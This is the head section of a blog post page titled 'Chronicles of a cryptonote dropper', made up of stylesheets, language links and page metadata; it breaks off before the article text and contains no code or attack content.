<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"amp lang=sv><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content h1{font-size:24px}.franklin-content h3{font-size:20px}.franklin-content h1,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double #d3d3d3;margin-top:1.5em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid #000}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a:hover{text-decoration:underline}.franklin-content .bibref a,.franklin-content .eqref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid #d3d3d3}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:focus,.scrollbox:hover{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metap,.hljs-metas{font-weight:700}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent:#3152ff;--accent2:#5a61ae;--accent3:#651b00;--alt:#ae6600;--alt2:#9e6c47;--alt3:#7f4200;--alt4:#ffbebe;--background-color:#ffebee;--foreground-color:#1c0005;--block-background:#423833;--red:#e42a2f;--yellow:#917329;--green:#29892d}body.dark{--accent:#72e200;--accent2:#add3a0;--accent3:#7a9eff;--alt:#8abeff;--alt2:#836bd1;--alt3:#a090de;--background-color:#001d49;--foreground-color:#dae2ff;--block-background:#011627;--red:#e42a2f;--yellow:#917329;--green:#29892d}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content #title a{padding:.5rem;line-height:100%}.franklin-content img{width:auto;text-align:center;padding:0}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__name{display:none}.author__place{font-size:.65em}.page__footer ul>li{list-style-type:none}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content.show{display:block}.lang-link .flag-icon{position:absolute;left:1rem;margin-top:.65rem}#site-nav .langs-dropdown-menu .lang-list{transition:height}#site-nav .langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:700;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:700}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>a>h1,.posts_list.franklin-content>.title>h2{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title,.posts_list.franklin-content>.title>h2{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem #fff}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:700}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}.shows_list h3{font-size:1.5rem}a.imdb{padding:0 .5rem}#searchResults ul li{margin-bottom:1rem}.lunrSearchForm .search-input:focus{background:var(--block-background)}.lunrSearchForm .search-button{cursor:pointer}.lunrSearchForm .search-button:focus{color:var(--accent)}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview,.resultCount{color:gray}.result-query{font-weight:700}footer>*{float:left}footer a{-webkit-text-decoration:underline dotted;text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width:680px){#tag-name,.tag-desc{text-align:left}}@media (min-width:680px) and (max-width:1300px){#site-nav .ham:hover{cursor:pointer}#site-nav .vert{transition:max-height .33s ease-in,filter .33s ease-in}}@media (max-width:680px){.masthead__inner-wrap{display:block}#tag-name,.tag-desc{text-align:center}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width:680px){footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title:after{-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:active,.hvr-buzz-out:focus,.hvr-buzz-out:hover{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a:before{transition-property:left,right;transition-duration:.3s;transition-timing-function:ease-out}.franklin-content a:active:before,.franklin-content a:focus:before,.franklin-content a:hover:before{left:0;right:0}.hvr-outline-in:before{pointer-events:none;transition-duration:.2s;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:active:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:hover:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:active:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:hover:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}.masthead__menu ul li.author__avatar img{transition:transform .8s}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><meta charset=UTF-8><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link href=https://www.unto.re/de/posts/chronichles_of_a_cryptonote_dropper hreflang=de rel=alternate><link href=https://www.unto.re/it/posts/chronichles_of_a_cryptonote_dropper hreflang=it rel=alternate><link href=https://www.unto.re/zh/posts/chronichles_of_a_cryptonote_dropper hreflang=zh rel=alternate><link href=https://www.unto.re/es/posts/chronichles_of_a_cryptonote_dropper hreflang=es rel=alternate><link href=https://www.unto.re/hi/posts/chronichles_of_a_cryptonote_dropper hreflang=hi rel=alternate><link href=https://www.unto.re/ar/posts/chronichles_of_a_cryptonote_dropper hreflang=ar rel=alternate><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper hreflang=pt rel=alternate><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper hreflang=bn rel=alternate><link href=https://www.unto.re/ru/posts/chronichles_of_a_cryptonote_dropper hreflang=ru rel=alternate><link href=https://www.unto.re/ja/posts/chronichles_of_a_cryptonote_dropper hreflang=ja rel=alternate><link href=https://www.unto.re/pa/posts/chronichles_of_a_cryptonote_dropper hreflang=pa rel=alternate><link href=https://www.unto.re/jw/posts/chronichles_of_a_cryptonote_dropper hreflang=jw rel=alternate><link href=https://www.unto.re/vi/posts/chronichles_of_a_cryptonote_dropper hreflang=vi rel=alternate><link href=https://www.unto.re/fr/posts/chronichles_of_a_cryptonote_dropper hreflang=fr rel=alternate><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper hreflang=ur rel=alternate><link href=https://www.unto.re/tr/posts/chronichles_of_a_cryptonote_dropper hreflang=tr rel=alternate><link href=https://www.unto.re/pl/posts/chronichles_of_a_cryptonote_dropper hreflang=pl rel=alternate><link href=https://www.unto.re/uk/posts/chronichles_of_a_cryptonote_dropper hreflang=uk rel=alternate><link href=https://www.unto.re/nl/posts/chronichles_of_a_cryptonote_dropper hreflang=nl rel=alternate><link href=https://www.unto.re/el/posts/chronichles_of_a_cryptonote_dropper hreflang=el rel=alternate><link href=https://www.unto.re/sv/posts/chronichles_of_a_cryptonote_dropper hreflang=sv rel=alternate><link href=https://www.unto.re/zu/posts/chronichles_of_a_cryptonote_dropper hreflang=zu rel=alternate><link href=https://www.unto.re/ro/posts/chronichles_of_a_cryptonote_dropper hreflang=ro rel=alternate><link href=https://www.unto.re/ms/posts/chronichles_of_a_cryptonote_dropper hreflang=ms rel=alternate><link href=https://www.unto.re/ko/posts/chronichles_of_a_cryptonote_dropper hreflang=ko rel=alternate><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper hreflang=th rel=alternate><link href=https://www.unto.re/tl/posts/chronichles_of_a_cryptonote_dropper hreflang=tl rel=alternate><link title="untorehs webbplats"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/sv/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="Chronicles of a cryptonote dropper"property=og:title><meta content=article property=og:type><meta content=https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper property=og:url><meta content=https://www.unto.re/assets/appa.webp property=og:image><meta content="...How far are you willing to go for...pennies?"property=og:description><meta content="untoreh's site"property=og:site_name><meta content=en_US property=og:locale><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2022,"@context":"https://schema.org/","image":"/assets/appa.webp","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.webp"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.webp","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><style>:root{--block-background:var(--accent2);--small:14px;--normal:19px;--text-color:hsv(0, 0%, 20%)}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width:940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width:480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h2{font-size:22px}h2{text-align:left}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid #d3d3d3;margin-top:2em;margin-bottom:1em}.franklin-content h2 a{color:inherit}.franklin-content a{color:var(--alt2);text-decoration:none}body{counter-reset:eqnum}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}@media (prefers-color-scheme:light){body{--accent:#3152ff;--accent2:#5a61ae;--accent3:#651b00;--alt:#ae6600;--alt2:#9e6c47;--alt3:#7f4200;--background-color:#ffebee;--foreground-color:#1c0005;--block-background:#423833;--red:#e42a2f;--yellow:#917329;--green:#29892d}}@media (prefers-color-scheme:dark){body{--accent:#72e200;--accent2:#add3a0;--accent3:#7a9eff;--alt:#8abeff;--alt2:#836bd1;--alt3:#a090de;--background-color:#001d49;--foreground-color:#dae2ff;--block-background:#011627;--red:#e42a2f;--yellow:#917329;--green:#29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.franklin-content{color:var(--foreground-color)}.franklin-content .header-anchor{padding:.5rem!important;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}body>div>h1{text-align:center;color:var(--accent2)}body>div #page-description,body>div #title{text-align:center}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:700;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier 